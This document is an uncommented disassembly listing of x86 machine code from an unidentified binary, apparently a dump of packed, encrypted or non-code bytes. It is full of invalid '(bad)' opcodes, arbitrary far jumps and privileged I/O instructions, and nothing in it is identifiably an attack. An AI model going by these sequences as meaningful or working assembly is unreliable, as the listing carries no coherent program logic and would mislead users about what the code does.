  41837c:	lods   al,BYTE PTR ds:[esi]
  41837d:	push   ebp
  41837e:	dec    edi
  41837f:	push   cs
	...
  418398:	add    BYTE PTR [ebp+eax*1+0x79cc1de7],bl
  41839f:	pushf  
  4183a0:	retf   
  4183a1:	jg     0x418422
  4183a3:	push   edi
  4183a4:	add    al,0xf4
  4183a6:	add    al,0x98
  4183a8:	fwait
  4183a9:	jmp    0xfd6a:0xa53600c6
  4183b0:	cs clc 
  4183b2:	add    al,0x6a
  4183b4:	call   0x362a4581
  4183b9:	sbb    eax,0xbce60005
  4183be:	int3   
  4183bf:	push   0xffffffe8
  4183c1:	mov    al,0xc1
  4183c3:	mov    edi,0xc39d000a
  4183c8:	push   ss
  4183c9:	clc    
  4183ca:	add    al,0xd
  4183cc:	ds xor dh,bh
  4183cf:	shl    BYTE PTR [eax+0x7e],0x9f
  4183d3:	(bad)  
  4183d4:	call   0x72409ed0
  4183d9:	sub    al,0x9d
  4183db:	scas   eax,DWORD PTR es:[edi]
  4183dc:	mov    esi,0x960d04f7
  4183e1:	mov    edi,0xbc71ff1a
  4183e6:	addr16 loope 0x4183c2
  4183e9:	jg     0x41844d
  4183eb:	aad    0xe9
  4183ed:	idiv   ecx
  4183ef:	mov    ah,0xa9
  4183f1:	rol    ah,1
  4183f3:	pop    ebp
  4183f4:	jo     0x418473
  4183f6:	call   0x32c6:0x7df7e8ff
	...
  418415:	add    BYTE PTR [edi-0x3e],bh
  418418:	add    al,0xe9
  41841a:	dec    edx
  41841b:	jle    0x418409
  41841d:	sbb    BYTE PTR [ebp+0x6a],cl
  418420:	out    dx,al
  418421:	call   0x396891d
  418426:	lock push ebp
  418428:	std    
  418429:	aam    0x27
  41842b:	cmovo  ebp,ecx
  41842e:	jo     0x4183f0
  418430:	or     al,0x6c
  418432:	sub    eax,0x8bc35039
  418437:	jle    0x418472
  418439:	scas   al,BYTE PTR es:[edi]
  41843a:	repnz cmp eax,0xbce60004
  418440:	call   0x43cf04
  418445:	mov    ecx,ebx
  418447:	mov    edi,0x285d0000
  41844c:	cmp    DWORD PTR [ebx+ecx*2+0x43],ecx
  418450:	add    BYTE PTR [ecx+0x1069d78e],cl
  418456:	sar    BYTE PTR [ebp-0x38],1
  418459:	add    BYTE PTR ds:0x9e8d5003,bl
  41845f:	add    DWORD PTR [eax],0x0
  418462:	or     eax,0x75d7fb53
  418467:	add    ebp,edi
  418469:	call   FWORD PTR ds:0x1dd88626
  41846f:	add    eax,DWORD PTR [eax]
  418471:	push   eax
  418472:	nop
  418473:	adc    DWORD PTR [eax+0x50030d00],0xffffffff
	...
  418492:	add    BYTE PTR [edx-0x4de73b7e],ch
  418498:	das    
  418499:	in     al,dx
  41849a:	add    ecx,ebp
  41849c:	add    cl,BYTE PTR [ecx+0x2a986]
  4184a2:	add    ch,ch
  4184a4:	add    DWORD PTR [esi+0x2dcdc],0x50
  4184ab:	inc    esi
  4184ac:	pop    edx
  4184ad:	call   0x445192
  4184b2:	dec    DWORD PTR [ebx-0x57]
  4184b5:	add    eax,DWORD PTR [eax]
  4184b7:	popf   
  4184b8:	test   DWORD PTR [esi+0x29b00],eax
  4184be:	push   eax
  4184bf:	adc    BYTE PTR [edi-0x8],bh
  4184c2:	add    ebx,DWORD PTR [ebp-0x1c17affe]
  4184c8:	add    al,BYTE PTR [eax]
  4184ca:	add    BYTE PTR [eax],dl
  4184cc:	jg     0x4184e2
  4184ce:	push   es
  4184cf:	hlt    
  4184d0:	fwait
  4184d1:	add    DWORD PTR [eax+0x7f],edx
  4184d4:	fistp  DWORD PTR [ebx+0x19bf685]
  4184da:	mov    ebp,0x3e763
  4184df:	into   
  4184e0:	pushf  
  4184e1:	jp     0x4184a8
  4184e3:	pop    esp
  4184e4:	clc    
  4184e5:	aad    0x0
  4184e7:	hlt    
  4184e8:	scas   al,BYTE PTR es:[edi]
  4184e9:	jbe    0x4184ab
  4184eb:	xor    eax,0xb18713fc
  4184f0:	nop    edi
  4184f3:	jle    0x4184d4
  4184f5:	fwait
  4184f6:	retf   0x0
	...
  41850d:	add    BYTE PTR [eax],al
  41850f:	add    BYTE PTR [edx-0x64],al
  418512:	add    DWORD PTR ds:0x42f8dc6b,ecx
  418518:	sbb    BYTE PTR [edi-0x62e57e84],cl
  41851e:	add    DWORD PTR [eax],eax
  418520:	jg     0x418538
  418522:	or     eax,0x7c9bf408
  418527:	or     DWORD PTR [esi],0x7f00019d
  41852d:	pop    edx
  41852e:	mov    esp,0x1d3341c1
  418533:	and    al,0xec
  418535:	or     eax,0x98318b55
  41853a:	push   ecx
  41853b:	push   0x10
  41853d:	idiv   DWORD PTR [esi+0x49]
  418540:	cmp    BYTE PTR [ebx],dh
  418542:	(bad)  
  418543:	call   0x46331b
  418548:	outs   dx,DWORD PTR ds:[esi]
  418549:	fsubr  DWORD PTR [edi]
  41854b:	mov    ecx,esi
  41854d:	pop    es
  41854e:	push   ss
  41854f:	inc    eax
  418550:	hlt    
  418551:	xor    al,0x82
  418553:	(bad)  
  418554:	hlt    
  418555:	fwait
  418556:	add    DWORD PTR [edx+0x4],ebp
  418559:	and    DWORD PTR [eax+0x19bf480],ecx
  41855f:	push   eax
  418560:	jns    0x418566
  418562:	push   0xffffffbb
  418564:	hlt    
  418565:	add    al,0xe7
  418567:	push   ebx
  418568:	jns    0x418537
  41856a:	mov    edi,0xe7a57301
  41856f:	xor    BYTE PTR [edi-0x6c],0xe7
  418573:	add    eax,DWORD PTR [eax]
	...
  41858d:	hlt    
  41858e:	push   esp
  41858f:	ins    BYTE PTR es:[edi],dx
  418590:	cmp    BYTE PTR [esp+eax*1],0xe7
  418594:	add    esp,DWORD PTR [ebp+eiz*4+0xc308216]
  41859b:	pop    DWORD PTR [edi]
  41859d:	inc    ebx
  41859e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41859f:	out    0x80,eax
  4185a1:	ja     0x418535
  4185a3:	call   0x5c9679ab
  4185a8:	jb     0x4185f2
  4185aa:	add    esp,edi
  4185ac:	add    ecx,DWORD PTR [esi+0x19bb6a04]
  4185b2:	pushf  
  4185b3:	xor    esi,edx
  4185b5:	adc    ah,BYTE PTR [ebp+0x35a8862]
  4185bb:	out    0x3,eax
  4185bd:	jnp    0x418540
  4185bf:	retf   
  4185c0:	add    esp,esi
  4185c2:	add    al,0x41
  4185c4:	cld    
  4185c5:	jle    0x418551
  4185c7:	test   DWORD PTR [ebx],eax
  4185c9:	hlt    
  4185ca:	add    al,0x17
  4185cc:	jg     0x418643
  4185ce:	test   eax,0x34f403ea
  4185d3:	mov    dh,0xd5
  4185d5:	jne    0x4185a0
  4185d7:	fistp  DWORD PTR [ebx]
  4185d9:	lock add eax,0x8a6f03e7
  4185df:	pop    ecx
  4185e0:	add    esi,esp
  4185e2:	add    al,0x37
  4185e4:	jg     0x41864b
  4185e6:	popf   
  4185e7:	jmp    0xac80:0xe72ef403
  4185ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ef:	(bad)  
  4185f0:	sub    eax,0x0
	...
  418609:	add    ch,ah
  41860b:	add    eax,0x880ce900
  418610:	into   
  418611:	call   0x6ac88b0d
  418616:	or     BYTE PTR [edx],0x0
  418619:	jmp    0x6ccc92fb
  41861e:	cmp    ah,BYTE PTR [ebp+edi*8-0x7e703817]
  418625:	jmp    0x99418b23
  41862a:	mov    BYTE PTR [edx+0x2cf42d81],bh
  418630:	add    al,0xe8
  418632:	test   DWORD PTR [ebx+ecx*4],0xfda4266c
  418639:	jmp    0xfdf315e5
  41863e:	stc    
  41863f:	add    al,0x0
  418641:	xor    edi,0xffffff85
  418644:	enter  0x8006,0x47
  418648:	xor    eax,ebp
  41864a:	test   DWORD PTR [ebp+0x4f70383],0x8bb98e00
  418654:	add    DWORD PTR ds:0x3cfda400,0x3c000936
  41865e:	ins    DWORD PTR es:[edi],dx
  41865f:	mov    cl,0x7f
  418661:	mov    ebp,0xe9fda2ef
  418666:	je     0x4186cf
  418668:	clc    
  418669:	mov    edi,0xec00a188
	...
  418686:	add    BYTE PTR [edi+0x4],ah
  418689:	add    cl,ch
  41868b:	daa    
  41868c:	nop
  41868d:	and    DWORD PTR [ecx-0x6e025e6f],0x3e
  418694:	sar    ebp,0x96
  418697:	je     0x4186b8
  418699:	or     al,0xe9
  41869b:	jecxz  0x4186b0
  41869d:	mov    DWORD PTR [eax],eax
  41869f:	add    BYTE PTR ds:0x22a54d87,al
  4186a5:	cmp    eax,0xe8fb710b
  4186ab:	(bad)  
  4186ac:	sar    bl,cl
  4186ae:	inc    esp
  4186b0:	lds    ecx,FWORD PTR [eax]
  4186b2:	add    BYTE PTR [eax+0x1c],al
  4186b5:	in     al,dx
  4186b6:	add    ecx,0x6f
  4186b9:	jge    0x4186a7
  4186bb:	jns    0x4186c6
  4186bd:	add    BYTE PTR [eax],al
  4186bf:	and    BYTE PTR [edx],0xbc
  4186c2:	and    al,0x3d
  4186c4:	push   es
  4186c5:	add    BYTE PTR [eax],al
  4186c7:	mov    ch,0x63
  4186c9:	mov    eax,0x64845d01
  4186ce:	and    al,0x45
  4186d0:	pop    es
  4186d1:	mov    DWORD PTR [ecx+esi*1+0x1d00013e],eax
  4186d8:	aaa    
  4186d9:	mov    DWORD PTR [ecx+esi*1-0x5d],eax
  4186dd:	in     eax,0x3f
  4186df:	fnstenv [eax-0x5]
  4186e2:	mov    ecx,DWORD PTR [eax-0x61]
  4186e5:	mov    bh,0xee
  4186e7:	sbb    al,0x7
  4186e9:	add    BYTE PTR [ebp+0x0],cl
	...
  418703:	add    BYTE PTR [ecx-0x55],dl
  418706:	add    eax,0xfbcda0e8
  41870b:	(bad)  
  41870c:	mov    edx,0x9f5de123
  418711:	add    eax,0xa5098b00
  418716:	add    DWORD PTR [ebx+0x3],edx
  418719:	sbb    al,0xb3
  41871b:	xchg   edx,eax
  41871c:	int3   
  41871d:	push   es
  41871e:	add    al,ch
  418720:	mov    ch,0xf5
  418722:	cld    
  418723:	dec    esi
  418725:	shl    DWORD PTR [edi],cl
  418727:	ret    
  418728:	sbb    ebp,ebx
  41872a:	dec    esi
  41872b:	push   ebx
  41872c:	out    0xf4,eax
  41872e:	push   ebp
  41872f:	push   eax
  418730:	hlt    
  418731:	jp     0x418763
  418733:	and    al,0xd4
  418735:	ficom  WORD PTR [ebp+edi*8+0x9]
  418739:	hlt    
  41873a:	adc    al,BYTE PTR [eax-0xc]
  41873d:	mov    dh,0x7e
  418740:	retf   0xf828
  418743:	das    
  418744:	int3   
  418745:	hlt    
  418746:	test   al,0x74
  418748:	sti    
  418749:	lods   al,BYTE PTR cs:[esi]
  41874b:	adc    al,0xf9
  41874d:	hlt    
  41874e:	jnp    0x418767
  418750:	fisub  WORD PTR [ebx-0x67ef8b56]
  418756:	js     0x4186dd
  418758:	call   0xee2:0xc40001ad
  41875f:	dec    esp
  418760:	jmp    0xe407:0xb089016b
  418767:	xchg   BYTE PTR [eax],al
	...
  418781:	jnp    0x4187bd
  418783:	add    eax,DWORD PTR [eax]
  418785:	hlt    
  418786:	ror    BYTE PTR cs:[esp+eiz*2],0xad
  41878b:	inc    edi
  41878c:	pop    ecx
  41878d:	rol    BYTE PTR ss:[ecx],0x32
  418791:	xor    al,0xf7
  418793:	mov    al,0x89
  418795:	test   al,0xc7
  418797:	std    
  418798:	push   eax
  418799:	stos   BYTE PTR es:[edi],al
  41879a:	sub    BYTE PTR [ecx-0x4e],dh
  41879d:	cmc    
  41879e:	stos   DWORD PTR es:[edi],eax
  41879f:	add    eax,ebp
  4187a1:	jne    0x418743
  4187a3:	add    al,0x0
  4187a5:	mov    esi,0xe870c0ee
  4187ab:	push   esp
  4187ac:	push   ecx
  4187ad:	pop    esi
  4187ae:	cwde   
  4187af:	dec    edi
  4187b0:	push   eax
  4187b1:	jecxz  0x418792
  4187b3:	fistp  WORD PTR [edi]
  4187b5:	inc    edi
  4187b6:	jmp    FWORD PTR [eax+0x41bd5c13]
  4187bc:	add    BYTE PTR [edi],cl
  4187be:	outs   dx,DWORD PTR ds:[esi]
  4187bf:	daa    
  4187c0:	ss jno 0x4187c7
  4187c3:	repz repz add edi,DWORD PTR [esi+ebx*4]
  4187c8:	das    
  4187c9:	stc    
  4187ca:	test   DWORD PTR [edi+0x5eec2f0f],ecx
  4187d0:	or     al,0xe
  4187d2:	or     eax,0xf8d02f86
  4187d7:	imul   eax,DWORD PTR [edx+0x3e703ba],0x24
  4187de:	mov    ds:0x44ea37d4,al
  4187e3:	out    0x7e,eax
	...
  4187fd:	add    BYTE PTR [eax],dh
  4187ff:	jmp    0xd2bb050a
  418804:	call   0x23c77c0c
  418809:	not    DWORD PTR [ebx+0x364ea503]
  41880f:	adc    bh,ah
  418811:	cmc    
  418812:	xchg   ebx,eax
  418813:	lods   eax,DWORD PTR ds:[esi]
  418814:	ds jle 0x4187cf
  418817:	call   0x8febdefe
  41881c:	push   edi
  41881d:	aad    0x3b
  41881f:	mov    eax,ds:0xf90e9be7
  418824:	out    0x3,eax
  418826:	in     eax,0xbd
  418828:	rol    dh,cl
  41882a:	mov    al,ds:0x8e5699f0
  41882f:	clc    
  418830:	xchg   esp,eax
  418831:	push   ebx
  418832:	adc    DWORD PTR [eax],ebx
  418834:	retf   
  418835:	jecxz  0x4187db
  418837:	xor    eax,0xf38c0fee
  41883c:	es add al,0xbd
  41883f:	lds    ebx,FWORD PTR [ebp+0x12]
  418842:	jg     0x418855
  418844:	pop    ss
  418845:	in     al,dx
  418846:	inc    edx
  418847:	mov    al,ds:0x9d750153
  41884c:	(bad)  [esi]
  41884e:	repz mov eax,fs
  418851:	jae    0x418826
  418853:	inc    edx
  418854:	add    BYTE PTR [edx],dl
  418856:	mov    dl,0x9
  418858:	add    bl,bh
  41885a:	mov    bh,0xae
  41885c:	cmc    
  41885d:	cmp    al,0x39
  41885f:	mov    cl,0x7f
  418861:	lea    eax,[eax]
	...
  41887b:	in     al,0x6
  41887d:	add    cl,ch
  41887f:	inc    eax
  418880:	aaa    
  418881:	push   ebp
  418882:	pop    esp
  418883:	adc    esp,DWORD PTR [ebp-0x5]
  418886:	xchg   BYTE PTR [ebp-0x53],cl
  418889:	scas   eax,DWORD PTR es:[edi]
  41888a:	sbb    BYTE PTR [ebp-0x5e],0xfd
  41888e:	cld    
  41888f:	or     DWORD PTR [ebp+0x144d637b],0x8
  418896:	push   0xf896d645
  41889b:	pushf  
  41889c:	mov    BYTE PTR [ebx+0x5d],bh
  41889f:	mov    BYTE PTR [edx-0x2a0817b7],ah
  4188a5:	fdiv   DWORD PTR [eax+0x1b]
  4188a8:	popf   
  4188a9:	cmp    DWORD PTR [edx],ebp
  4188ab:	add    al,0x2f
  4188ad:	std    
  4188ae:	mov    esp,0x27895043
  4188b3:	pusha  
  4188b4:	out    0xfd,eax
  4188b6:	lea    ebp,es:[ebx]
  4188b9:	adc    al,0x6c
  4188bb:	mov    bl,0x32
  4188bd:	std    
  4188be:	push   ss
  4188bf:	pop    ebp
  4188c0:	xor    eax,0x5cd35c51
  4188c5:	xor    DWORD PTR [ecx],0xb83fad4d
  4188cb:	test   BYTE PTR [ebx+eax*4],0x29
  4188cf:	fdivp  st(3),st
  4188d1:	mov    BYTE PTR [edi],ah
  4188d3:	test   al,0x2c
  4188d5:	mov    cl,cl
  4188d7:	mov    al,0x4
  4188d9:	mov    esp,DWORD PTR [edi+edi*2-0x63]
  4188dd:	std    
  4188de:	(bad)  
	...
  4188f7:	add    BYTE PTR [edi-0x53],al
  4188fa:	adc    DWORD PTR [edi+esi*8+0x4],ebx
  4188fe:	add    DWORD PTR [eax],0xffffff8d
  418901:	pushf  
  418902:	xchg   edx,eax
  418903:	shl    bh,0xc9
  418906:	jno    0x418911
  418908:	into   
  418909:	ret    
  41890a:	mov    WORD PTR [eax-0x74],bx
  41890e:	idiv   edi
  418910:	xchg   edx,eax
  418911:	push   ss
  418912:	sbb    DWORD PTR [eax+0x50fb6c56],0x13c40e82
  41891c:	int    0x8
  41891e:	push   0x7
  418920:	and    bh,ch
  418922:	fistp  WORD PTR [eax+0x65]
  418925:	out    dx,eax
  418926:	int3   
  418927:	add    BYTE PTR [ebp+0x5a0b591b],bl
  41892d:	fdivp  st(3),st
  41892f:	add    DWORD PTR [ebp-0x914fffd],ecx
  418935:	sub    ebp,esi
  418937:	add    DWORD PTR [ebp+0x3],ebx
  41893a:	mov    DWORD PTR [ebp-0x49993],eax
  418940:	in     eax,0xb
  418942:	inc    eax
  418943:	dec    ecx
  418944:	mov    BYTE PTR [ecx+0x32],dh
  418947:	shl    BYTE PTR [esi+eax*8+0x204d0000],0x79
  41894f:	hlt    
  418950:	jp     0x4189be
  418952:	jno    0x418950
  418954:	mov    al,ds:0x7750dfde
  418959:	xorps  xmm1,XMMWORD PTR [ebp+0x0]
	...
  418974:	add    BYTE PTR [eax+0x73],dh
  418977:	call   0x43c0a7
  41897c:	sbb    ecx,0xffffff97
  41897f:	cmp    al,0x2
  418982:	xchg   edi,eax
  418983:	sbb    DWORD PTR [esi-0x74fffcf3],0x8589384a
  41898d:	jne    0x4189f9
  41898f:	sti    
  418990:	push   esp
  418992:	(bad)  [esi-0x7d]
  418995:	test   BYTE PTR [ebp-0x4bbb025b],dh
  41899b:	ja     0x418929
  41899d:	hlt    
  41899e:	stos   DWORD PTR es:[edi],eax
  41899f:	add    al,0xfb
  4189a2:	das    
  4189a3:	test   BYTE PTR [eax],al
  4189a5:	hlt    
  4189a6:	stos   DWORD PTR es:[edi],eax
  4189a7:	repnz fsub DWORD PTR [edi]
  4189aa:	hlt    
  4189ab:	add    DWORD PTR [eax],0xfffffff4
  4189ae:	stos   DWORD PTR es:[edi],eax
  4189af:	pop    ss
  4189b0:	inc    DWORD PTR [esi-0x25]
  4189b3:	sbb    eax,DWORD PTR [eax]
  4189b5:	hlt    
  4189b6:	stos   DWORD PTR es:[edi],eax
  4189b7:	ror    DWORD PTR [ebx-0x254c38f],0x93
  4189be:	cld    
  4189bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189c0:	adc    esi,DWORD PTR [edx+edi*4]
  4189c3:	inc    ecx
  4189c4:	add    BYTE PTR [edi+0x1c],ch
  4189c7:	cmp    esi,0xfd0cc17b
  4189cd:	or     DWORD PTR [eax+0x2af44012],esi
  4189d3:	lods   al,BYTE PTR ds:[esi]
  4189d4:	push   eax
  4189d5:	jmp    0x853035
	...
  4189f2:	pop    eax
  4189f3:	sub    eax,0xab5cfc27
  4189f8:	add    DWORD PTR [eax],eax
  4189fa:	(bad)  
  4189fb:	das    
  4189fc:	cdq    
  4189fd:	inc    edx
  4189fe:	outs   dx,DWORD PTR ds:[esi]
  4189ff:	jno    0x4189f6
  418a01:	push   eax
  418a02:	imul   esi,DWORD PTR [ecx-0x5b],0x2efecb50
  418a09:	clc    
  418a0a:	ret    0xef6
  418a0d:	dec    esp
  418a0e:	push   es
  418a0f:	ins    BYTE PTR es:[edi],dx
  418a10:	add    DWORD PTR [ebx-0x3a03dfcc],eax
  418a16:	mov    ecx,0x89370492
  418a1b:	xchg   edi,eax
  418a1c:	sub    eax,0xfa916c01
  418a21:	push   ebp
  418a22:	sti    
  418a23:	add    al,0xfc
  418a25:	out    0x5,eax
  418a27:	inc    ebp
  418a28:	out    0x4d,eax
  418a2a:	jmp    0x34547526
  418a2f:	add    eax,0x17ed490f
  418a34:	repz js 0x418aae
  418a37:	je     0x4189f9
  418a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a3a:	leave  
  418a3b:	xor    al,0xbf
  418a3d:	jo     0x418a11
  418a3f:	popf   
  418a40:	scas   al,BYTE PTR es:[edi]
  418a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a42:	inc    edi
  418a43:	popf   
  418a44:	(bad)
  418a48:	out    0x6c,eax
  418a4a:	call   0x4787:0x6f03e703
  418a51:	test   al,0x99
  418a53:	popf   
  418a54:	lods   eax,DWORD PTR ds:[esi]
  418a55:	add    eax,DWORD PTR [eax]
	...
  418a6f:	hlt    
  418a70:	inc    esp
  418a71:	xor    BYTE PTR [ecx],dh
  418a73:	or     DWORD PTR [edx+0x3f20fb2c],0x12
  418a7a:	mov    ebp,0x50e70cb6
  418a7f:	jge    0x418a31
  418a81:	push   0xe70c4497
  418a86:	add    eax,ebp
  418a88:	ss mov dh,0x78
  418a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a8c:	js     0x418ad2
  418a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a8f:	push   ecx
  418a90:	lods   al,BYTE PTR ds:[esi]
  418a91:	xlat   BYTE PTR ds:[ebx]
  418a92:	test   eax,0xfc19d49
  418a97:	popf   
  418a98:	xor    DWORD PTR [eax+eax*4-0x4e],ebx
  418a9c:	popf   
  418a9d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  418a9f:	les    ebp,FWORD PTR [edx]
  418aa1:	out    0x78,eax
  418aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aa4:	jo     0x418b10
  418aa6:	mov    ebx,0xd61fac21
  418aab:	sbb    bl,BYTE PTR [ebp-0x6d3c94]
  418ab1:	jno    0x418a70
  418ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ab4:	sub    al,0x0
  418ab6:	popa   
  418ab7:	push   edi
  418ab8:	inc    ebx
  418ab9:	add    BYTE PTR [esp+esi*2-0x70],bl
  418abd:	stc    
  418abe:	out    0x99,al
  418ac0:	xor    eax,0x56d83e8
  418ac5:	add    BYTE PTR [eax+edi*4+0xa],ch
  418ac9:	xchg   ebx,eax
  418aca:	test   eax,0xf073c574
  418acf:	les    ebx,FWORD PTR [esi+eiz*2+0x70]
	...
  418aeb:	add    BYTE PTR [ebx-0x77],cl
  418aee:	stc    
  418aef:	mov    dh,0x99
  418af1:	nop
  418af2:	sbb    DWORD PTR [ebp-0x73],0xffffff9a
  418af6:	std    
  418af7:	cmp    DWORD PTR [ecx-0x8],ebx
  418afa:	ret    
  418afb:	cli    
  418afc:	aaa    
  418afd:	add    eax,0x99da5489
  418b02:	std    
  418b03:	mov    ?,esi
  418b05:	or     al,0x8b
  418b07:	cld    
  418b08:	ret    
  418b09:	cmp    eax,0x54174e8
  418b0e:	add    BYTE PTR [eax+0x51],ch
  418b11:	(bad)  
  418b12:	xchg   esi,eax
  418b13:	fcom   DWORD PTR [eax+0x32]
  418b16:	mov    DWORD PTR [edi],ebp
  418b18:	enter  0x7b8f,0x65
  418b1c:	mov    BYTE PTR [ecx+0x33f7e838],dh
  418b22:	push   edi
  418b23:	push   0xffffff88
  418b25:	call   0xe9fd:0x9c216d0d
  418b2c:	int3   
  418b2d:	rcl    DWORD PTR [eax+0x64],0xc3
  418b31:	mov    cl,bh
  418b33:	cs xchg ecx,eax
  418b35:	xor    eax,0x94746c8b
  418b3a:	std    
  418b3b:	push   ds
  418b3c:	shr    BYTE PTR [ebp+esi*1-0x7cfb079e],0x29
  418b44:	and    DWORD PTR [eax+0x81c0057],ecx
  418b4a:	add    BYTE PTR [ebp-0xb6b70],cl
	...
  418b68:	add    BYTE PTR [edx],cl
  418b6a:	cmp    BYTE PTR [ecx-0x4906e7b],cl
  418b70:	jmp    FWORD PTR ds:0xef101162
  418b76:	inc    edi
  418b77:	add    BYTE PTR [ebx-0x76ffaad0],al
  418b7d:	adc    BYTE PTR [ecx+0x7f],dl
  418b80:	clc    
  418b81:	mov    edx,0xdc1e8190
  418b86:	pop    es
  418b87:	add    BYTE PTR [ebx-0x720496e8],al
  418b8d:	push   eax
  418b8e:	call   0x379c8b85
  418b93:	mov    DWORD PTR [ebp-0x492e7],eax
  418b99:	fst    QWORD PTR [ebx]
  418b9b:	add    DWORD PTR [esp+eax*4+0x6550fb60],0x9d008a72
  418ba6:	sbb    al,al
  418ba8:	movups XMMWORD PTR [ebx],xmm4
  418bab:	add    BYTE PTR [eax],al
  418bad:	(bad)  
  418bae:	(bad)  
  418baf:	jg     0x418bb1
  418bb1:	pop    ebp
  418bb2:	pop    es
  418bb3:	push   0x3
  418bb5:	inc    edi
  418bb6:	add    al,0x68
  418bb8:	add    BYTE PTR [ebp+0x7],cl
  418bbb:	or     BYTE PTR [ebp-0xae430],0xba
  418bc2:	aaa    
  418bc3:	mov    DWORD PTR [ebp-0x4b],eax
  418bc6:	jg     0x418b58
  418bc8:	jmp    0xc0c5ecd7
	...
  418be5:	add    BYTE PTR [edx],bl
  418be7:	sbb    ebx,DWORD PTR [eax-0x76f8e300]
  418bed:	inc    ebp
  418bee:	aad    0x37
  418bf0:	mov    DWORD PTR [ebp-0xc],esi
  418bf3:	or     edi,ebp
  418bf5:	fmul   DWORD PTR [edi+edx*8]
  418bf8:	cdq    
  418bf9:	std    
  418bfa:	adc    ebp,DWORD PTR [ecx]
  418bfc:	shl    DWORD PTR [ebp+edx*4+0x16],0x2e
  418c01:	in     al,0x6f
  418c03:	jmp    0x418bfc
  418c05:	inc    edx
  418c06:	or     al,0x11
  418c08:	dec    esp
  418c09:	xor    DWORD PTR [ecx-0x4c],0x3e457504
  418c10:	or     al,0x7f
  418c12:	loop   0x418bc0
  418c14:	add    DWORD PTR [eax-0x74b6cd0c],esp
  418c1a:	cmp    ch,BYTE PTR [esi-0x11bf3f78]
  418c20:	stos   DWORD PTR es:[edi],eax
  418c21:	xchg   edx,eax
  418c22:	sub    al,0xad
  418c24:	add    DWORD PTR [ecx+0x74a121bc],ecx
  418c2a:	jmp    0x418c54
  418c2c:	call   0x9fd:0x38f5f977
  418c33:	mov    eax,0x2ef43ff3
  418c38:	int3   
  418c39:	std    
  418c3a:	lahf   
  418c3b:	xchg   edi,eax
  418c3c:	aaa    
  418c3d:	push   ebp
  418c3e:	jns    0x418c21
  418c40:	fwait
  418c41:	push   eax
  418c42:	mov    WORD PTR [eax+0x577bfdab],?
  418c48:	(bad)  
  418c49:	jae    0x418c4b
	...
  418c63:	rcr    BYTE PTR [ecx+0x3a],1
  418c66:	mov    esi,DWORD PTR [ecx+0x10]
  418c69:	lahf   
  418c6a:	std    
  418c6b:	arpl   WORD PTR [ebp+ebx*8-0x8],ax
  418c6f:	pop    ebx
  418c70:	dec    ebx
  418c71:	lea    eax,[ebx-0x4]
  418c74:	adc    al,0xd4
  418c76:	xchg   cl,cl
  418c78:	iret   
  418c79:	push   esp
  418c7a:	inc    DWORD PTR [edx+0x59]
  418c7d:	cdq    
  418c7e:	std    
  418c7f:	loope  0x418c20
  418c81:	idiv   BYTE PTR [edi]
  418c83:	hlt    
  418c84:	add    al,0x6a
  418c86:	push   ecx
  418c87:	sub    al,0x9a
  418c89:	arpl   WORD PTR [edi-0x769bf758],di
  418c8f:	jo     0x418c2d
  418c91:	push   cs
  418c92:	mov    ds:0xb025aca4,eax
  418c97:	or     DWORD PTR [edx+0x508216a],ebx
  418c9d:	jl     0x418c8c
  418c9f:	outs   dx,BYTE PTR ds:[esi]
  418ca0:	inc    eax
  418ca1:	out    dx,eax
  418ca2:	stos   DWORD PTR es:[edi],eax
  418ca3:	(bad)  
  418ca4:	lods   al,BYTE PTR ds:[esi]
  418ca5:	out    0xa2,al
  418ca7:	jg     0x418d28
  418ca9:	adc    ebx,DWORD PTR [ebx-0x5cc8661f]
  418caf:	addr16 xchg ebp,eax
  418cb1:	into   
  418cb2:	clc    
  418cb3:	div    esi
  418cb5:	es add al,0x77
  418cb8:	(bad)  
  418cb9:	out    dx,al
  418cba:	mov    BYTE PTR [edi-0x325d4966],bh
  418cc0:	hlt    
  418cc1:	adc    eax,0xe84cefac
  418cc6:	add    eax,DWORD PTR [eax]
	...
  418ce0:	popf   
  418ce1:	push   ebp
  418ce2:	ins    BYTE PTR es:[edi],dx
  418ce3:	dec    eax
  418ce4:	pushf  
  418ce5:	lods   al,BYTE PTR ds:[esi]
  418ce6:	inc    edx
  418ce7:	stos   DWORD PTR es:[edi],eax
  418ce8:	cdq    
  418ce9:	cdq    
  418cea:	mov    ds,WORD PTR [eax]
  418cec:	test   BYTE PTR [ecx+0x44e60fdc],bl
  418cf2:	out    0x5c,eax
  418cf4:	xchg   edx,eax
  418cf5:	add    esp,edi
  418cf7:	add    ebp,DWORD PTR [edi+0x7f]
  418cfa:	push   ebx
  418cfb:	mov    al,ds:0x32d9971
  418d00:	hlt    
  418d01:	inc    esp
  418d02:	mov    al,0x18
  418d04:	imul   ecx,DWORD PTR [ebp-0xfb26854],0xffffff8f
  418d0b:	mov    cl,0x53
  418d0d:	cdq    
  418d0e:	out    0x90,eax
  418d10:	ja     0x418d82
  418d12:	cmp    al,0xa2
  418d14:	inc    ecx
  418d15:	ret    0xe900
  418d18:	test   DWORD PTR [edi+eax*2-0x4c],0xc6bfd390
  418d20:	mov    ch,0x3b
  418d22:	(bad)  
  418d23:	sub    edi,ebx
  418d25:	add    al,0x6a
  418d27:	jmp    0xe9ab91f5
  418d2c:	loope  0x418d34
  418d2e:	push   0xffffffe9
  418d30:	push   esi
  418d31:	adc    BYTE PTR [ebx*8-0x24740aaa],ah
  418d38:	mov    bh,0x4
  418d3a:	mov    DWORD PTR [ebp+0x288704db],ebx
  418d40:	cld    
  418d41:	aad    0xc6
  418d43:	add    BYTE PTR fs:[eax],al
	...
  418d5a:	add    BYTE PTR [eax],al
  418d5c:	add    BYTE PTR [eax-0x4d566cf6],bh
  418d62:	or     eax,0xa9813400
  418d67:	or     ebp,0x9ec8668
  418d6d:	or     DWORD PTR [edx],esi
  418d6f:	call   0xfdd9b52e
  418d74:	bound  edx,QWORD PTR [ebx]
  418d76:	icebp  
  418d77:	sub    DWORD PTR [ecx+0x258b190c],0xffffff8c
  418d7e:	or     al,0x50
